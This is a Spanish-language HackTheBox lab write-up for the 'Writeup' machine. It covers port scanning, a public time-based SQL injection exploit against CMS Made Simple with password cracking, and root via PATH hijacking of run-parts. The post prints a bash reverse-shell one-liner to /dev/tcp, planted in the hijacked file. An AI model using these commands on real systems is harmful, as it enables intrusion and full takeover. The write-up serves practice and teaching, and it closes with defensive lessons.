---
title: HackTheBox Writeup
date: 2021-07-25 12:00:00 -0400
image: 
  src: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/banner.png
  height: 1100
  width: 500
categories: [HTB Writeups, Linux Easy]
tags: [sqli, path hijacking, web, cms]
---

***

**Machine IP** : 10.10.10.138

**DATE**  : 25/07/2021

***

## Matriz de la maquina

Esta matriz nos muestra las características de explotación de la maquina.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/matrix.png)

## Reconocimiento


Primero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.

## Nmap 

Usamos el siguiente comando para escanear todos los puertos de una manera rapida.

```bash
nmap -p- --open -T5 -v -n -Pn 10.10.10.138
```

Posteriormente utilizamos este comando con los puertos del anterior escaneo para saber las versiones de cada servicio.

```bash
nmap -sC -sV -n -p22,80 -Pn 10.10.10.138
```

Nos arroja este resultado:

```bash
~  nmap -sC -sV -p22,80 10.10.11.138 -Pn                                                                                                                                                        4s   
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 11:07 EDT
Nmap scan report for 10.10.11.138
Host is up.

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp filtered http

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds

```

Podemos observar dos puertos abiertos, el `22` que pertenece a `ssh` y el `80` que es un `http`, procederemos a revisar la web que corre en el servicio http y haremos una busqueda de directorio con `gobuster`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/web.png)

Al parecer el servidor web está protegido a Dos, por eso gobuster no puede hacer su trabajo, revisando `robots.txt` una ruta muy comun en los ctf, podemos ver que tiene el directorio writeup oculto.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/robots.png)

Al revisar ese directorio solo son writeups de otras maquinas, pero al escanear la página con Wappalizer podemos observar que está hecho con `CMS Made Simple`, lo cual parece curioso.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/wappa.png)

Al investigar exploits en esta tecnología nos encontramos con un [SQL Injection Exploit](https://www.exploit-db.com/exploits/46635)

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/exploitdb.png)

Este exploit es un `sql injection basado en tiempo`, lo que hace es dumpear las credenciales del portal y nos la entrega junto con la contraseña que esta hasheada, pero tiene una opcion para hacer bruteforce a la contraseña.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/sql.png)

Luego de descargarnolos, ejecutamos el `exploit` con el comando

```bash
python2 exploit.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt 
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/creden.png)

Con estas credenciales nos logeamos via `ssh` con el usuario `jkr` y obtenemos el `user.txt`.


## Escalamiento de privilegios

Luego de obtener acceso como el usuario `jkr`, probé con `sudo -l` para listar los `binarios` que se pueden ejecutar como sudo, pero no tenia privilegios, luego vi los grupos en los que estaba el usuario jkr y habia uno llamado `staff`, investigando un poco encontré que este grupo puede crear archivos dentro de `usr/local/bin`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/id.png)

Luego listé los procesos que se ejectuban en la maquina con la herramienta [pspy](https://github.com/DominicBreuker/pspy), luego de esto como no encontré nada, pedí ayuda a unos colegas y me dijeron que revise los procesos llamados cuando se iniciaba sesion son `ssh`, en otra terminal me logeé y al momento de logearme via ssh ocurría esto en la maquina.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/pspy.png)

Como podemos observar se ejecuta el comando `run-parts` sin ruta absoluta, entonces podemos aprovechar para colar un archivo llamado run parts en los directorios del `path` y autoejecutarse al momento de que lo encuentre, esta vulnerabilidad se llama `Path Hijacking`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/path.png)

Hay varias formas de obtener `root` con esta vulnerabilidad, podemos crear una `reverse shell` en el archivo `run-parts` o simplemente asignar permisos SUID a la bash , en este caso crearemos una reverse shell con el comando.

```bash
bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/payload.png)

Luego le damos persmisos de ejecución con el comando

```bash
chmod +x run-parts
```
Por ultimos en otra terminal nos logeamos via ssh con el usuario `jkr` y obtenemos la `reverse shell` hacia nuestra maquina como el usuario `root`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/writeup/roottxt.png)

Finalmente nos metemos al directorio de `root` y observamos el `root.txt`.


## Conclusiones

Fue una buena maquina y nos deja unas cuantas lecciones...

No usar versiones antiguas de las tecnologías web y menos sabiendo que tienen vulnerabilidades criticas.

No manejar contraseñas faciles de descrifrar, se sugiere una constraseña con simbolos y mayusculas.

No asignar grupos con permisos de escritura como el de `staff` a un usuario no privilegiado.

Sanitizar el input del usuario para evitar `sql injections` basados en tiempo.

Gracias por leer, Happy hacking and always try harder!